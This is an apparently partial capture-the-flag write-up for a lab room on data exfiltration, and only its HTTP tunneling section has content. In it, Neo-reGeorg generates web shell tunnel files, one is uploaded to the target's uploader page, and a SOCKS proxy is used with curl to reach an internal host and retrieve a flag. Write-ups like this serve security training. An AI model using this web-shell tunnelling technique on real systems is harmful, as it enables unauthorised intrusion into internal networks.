# Room Information

# Room Tasks

## Exfiltrate Using HTTP(S)

### 

### HTTP Tunneling

```Bash
root@ip-10-10-188-127# cd /opt/Neo-reGeorg
```

```Bash
root@ip-10-10-188-127:/opt/Neo-reGeorg# python3 neoreg.py generate -k thm                                                                                                                                                                              


          "$$$$$$''  'M$  '$$$@m
        :$$$$$$$$$$$$$$''$$$$'
       '$'    'JZI'$$&  $$$$'
                 '$$$  '$$$$
                 $$$$  J$$$$'
                m$$$$  $$$$,
                $$$$@  '$$$$_          Neo-reGeorg
             '1t$$$$' '$$$$<
          '$$$$$$$$$$'  $$$$          version 3.8.0
               '@$$$$'  $$$$'
                '$$$$  '$$$@
             'z$$$$$$  @$$$
                r$$$   $$|
                '$$v c$$
               '$$v $$v$$$$$$$$$#
               $$x$$$$$$$$$twelve$$$@$'
             @$$$@L '    '<@$$$$$$$$`
           $$                 '$$$


    [ Github ] https://github.com/L-codes/neoreg

    [+] Mkdir a directory: neoreg_servers
    [+] Create neoreg server files:
       => neoreg_servers/tunnel.aspx
       => neoreg_servers/tunnel.ashx
       => neoreg_servers/tunnel.jsp
       => neoreg_servers/tunnel_compatibility.jsp
       => neoreg_servers/tunnel.jspx
       => neoreg_servers/tunnel_compatibility.jspx
       => neoreg_servers/tunnel.php
```

```Bash
root@ip-10-10-188-127:/opt/Neo-reGeorg# firefox http://10.10.83.6/uploader
```

![]()

![]()

![]()

```Bash
root@ip-10-10-188-127:/opt/Neo-reGeorg# python3 neoreg.py -k thm -uttp://10.10.83.6/uploader/files/tunnel.php


          "$$$$$$''  'M$  '$$$@m
        :$$$$$$$$$$$$$$''$$$$'
       '$'    'JZI'$$&  $$$$'
                 '$$$  '$$$$
                 $$$$  J$$$$'
                m$$$$  $$$$,
                $$$$@  '$$$$_          Neo-reGeorg
             '1t$$$$' '$$$$<
          '$$$$$$$$$$'  $$$$          version 3.8.0
               '@$$$$'  $$$$'
                '$$$$  '$$$@
             'z$$$$$$  @$$$
                r$$$   $$|
                '$$v c$$
               '$$v $$v$$$$$$$$$#
               $$x$$$$$$$$$twelve$$$@$'
             @$$$@L '    '<@$$$$$$$$`
           $$                 '$$$


    [ Github ] https://github.com/L-codes/Neo-reGeorg

+------------------------------------------------------------------------+
```

```Bash
curl --socks5 127.0.0.1:1080 http://172.20.0.120
<p><a href="/flag">Get Your Flag!</a></p>
```

```Bash
root@ip-10-10-188-127:~# curl --socks5 127.0.0.1:1080 http://172.20.0.120/flag
<p>Your flag: THM{H77p_7unn3l1n9_l1k3_l337}</p>
```

## Exfiltration Using ICMP

## Exfiltration Over DNS

